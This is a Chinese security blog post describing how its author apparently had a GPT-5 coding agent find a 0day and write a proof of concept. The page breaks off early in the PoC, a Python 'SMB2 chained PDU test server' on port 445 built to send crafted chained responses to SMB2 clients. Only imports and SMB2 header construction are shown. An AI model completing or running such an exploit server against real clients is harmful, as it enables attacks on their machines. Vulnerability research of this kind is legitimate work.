@@ -1,0 +1,2570 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap,wp,Reverse,Kernel,reverse,PWN,NetWorkSecurity,linux,arch,archlinux,逆向,二进制">
+    
+    <meta name="description" content="">
+    <meta name="description" content="纯粹AI的poc： 下面是我用vscode的gpt-5 agent撰写的漏洞poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vibe SecurityReserch: 我是如何用ai发现0day并撰写poc的">
+<meta property="og:url" content="https://zjw1nd.github.io/2025/08/26/Vibe-SecurityReserch-%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%94%A8ai%E5%8F%91%E7%8E%B00day%E5%B9%B6%E6%92%B0%E5%86%99poc%E7%9A%84/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="纯粹AI的poc： 下面是我用vscode的gpt-5 agent撰写的漏洞poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-08-26T07:31:11.000Z">
+<meta property="article:modified_time" content="2025-08-26T07:33:17.039Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="Vuln">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>Vibe SecurityReserch: 我是如何用ai发现0day并撰写poc的 · Zj_W1nd&#39;s BLOG</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Zj_W1nd's BLOG</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Zj_W1nd&#39;s BLOG</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">Vibe SecurityReserch: 我是如何用ai发现0day并撰写poc的</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                Vibe SecurityReserch: 我是如何用ai发现0day并撰写poc的
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="Vuln">Vuln</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/08/26</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1>纯粹AI的poc：</h1>
+<p>下面是我用vscode的gpt-5 agent撰写的漏洞poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">SMB2 链式 PDU 测试服务器</span></span><br><span class="line"><span class="string">用于测试 SMB2 客户端的链式 PDU 处理能力</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置日志</span></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;[%(asctime)s] %(levelname)s: %(message)s&#x27;</span>)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArchSMB2TestServer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">445</span>, debug_mode=<span class="literal">False</span></span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.clients_served = <span class="number">0</span></span><br><span class="line">        self.debug_mode = debug_mode</span><br><span class="line">        self.chain_count = <span class="number">3</span>  <span class="comment"># 链式PDU的默认数量</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.debug_mode:</span><br><span class="line">            logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line">            logger.info(<span class="string">&quot;调试模式已启用&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_smb2_header</span>(<span class="params">self, command=<span class="number">0x0000</span>, status=<span class="number">0x00000000</span>, </span></span><br><span class="line"><span class="params">                          message_id=<span class="number">0</span>, session_id=<span class="number">0</span>, tree_id=<span class="number">0</span>, </span></span><br><span class="line"><span class="params">                          next_command=<span class="number">0</span>, flags=<span class="number">0x00000001</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建标准 SMB2 头部 (64字节)&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            header = struct.pack(<span class="string">&#x27;&lt;4s&#x27;</span>, <span class="string">b&#x27;\xFE\x53\x4D\x42&#x27;</span>)     <span class="comment"># Protocol: SMB2</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">64</span>)                      <span class="comment"># StructureSize</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)                       <span class="comment"># CreditCharge</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, status)                  <span class="comment"># Status</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, command)                 <span class="comment"># Command</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">1</span>)                       <span class="comment"># CreditRequest</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, flags)                   <span class="comment"># Flags</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, next_command)            <span class="comment"># NextCommand ★关键</span></span><br><span class="line">            header += 